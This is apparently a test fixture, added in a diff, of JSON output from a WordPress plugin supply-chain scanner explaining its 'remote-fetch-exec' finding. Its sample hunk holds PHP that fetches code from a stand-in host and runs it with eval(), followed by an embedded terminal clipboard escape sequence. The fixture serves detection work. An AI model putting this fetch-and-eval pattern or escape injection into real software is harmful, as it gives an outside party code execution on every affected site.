@@ -1,0 +1,95 @@
+{
+  "schema": "rhythm-sightread/v1",
+  "kind": "explain",
+  "tool": "rhythm-sightread",
+  "version": "<version>",
+  "complete": true,
+  "summary": {
+    "updates": 0,
+    "hold": 0,
+    "review": 0,
+    "routine": 0,
+    "allowed": 0,
+    "unverified": 0,
+    "critical": 0,
+    "high": 0,
+    "medium": 0,
+    "low": 0,
+    "info": 0,
+    "baselined": 0,
+    "allowed_findings": 0,
+    "ignored": 0,
+    "demoted": 0,
+    "not_checked": 0,
+    "from_cache": 0
+  },
+  "verdict": "ok",
+  "data": {
+    "signal": {
+      "id": "remote-fetch-exec",
+      "title": "Fetches remote code and runs it",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "ecosystems": [
+        "wp-plugin",
+        "wp-theme",
+        "composer",
+        "npm"
+      ],
+      "emitter": "detect",
+      "unignorable": false,
+      "help_uri": "https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec"
+    },
+    "explain": {
+      "why": "A release that shows remote-fetch-exec can change what runs on every request of your site. This text stands in for the detect lane's explain YAML, which the release links.",
+      "how_to_review": "1. Open the flagged file at the line the finding names and read the code around it, including what calls it.\n2. Compare with the changelog.",
+      "false_alarms": "A vendored library can show the same pattern.",
+      "incidents": "Example 2024: a plugin sold to a new owner shipped remote-fetch-exec.",
+      "advice": "Review remote-fetch-exec before you update.",
+      "more": "https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec"
+    },
+    "finding": {
+      "id": "remote-fetch-exec",
+      "name": "Fetches remote code and runs it",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "file": "includes/class-wpos-analytics.php",
+      "line": 88,
+      "end_line": 104,
+      "evidence": "wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)",
+      "domains": [
+        "analytics.wpos-cdn.example"
+      ],
+      "raised_by": [],
+      "demoted": "",
+      "advice": "Review remote-fetch-exec before you update.",
+      "help_uri": "https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec",
+      "fingerprint": "42676b77378d2cfc",
+      "allowed": null,
+      "baselined": false,
+      "ignored": false,
+      "below_confidence": false
+    },
+    "hunks": [
+      {
+        "path": "includes/class-wpos-analytics.php",
+        "old_start": 80,
+        "old_lines": 8,
+        "new_start": 81,
+        "new_lines": 10,
+        "lines": [
+          " a",
+          " b",
+          " c",
+          " d",
+          " e",
+          " function wpos_init() {",
+          "+  $b = wp_remote_get('https://analytics.wpos-cdn.example/v2/p');",
+          "+  eval($b['body']); \\x1b]52;c;eA==\\x07",
+          " }",
+          " f"
+        ]
+      }
+    ]
+  }
+}
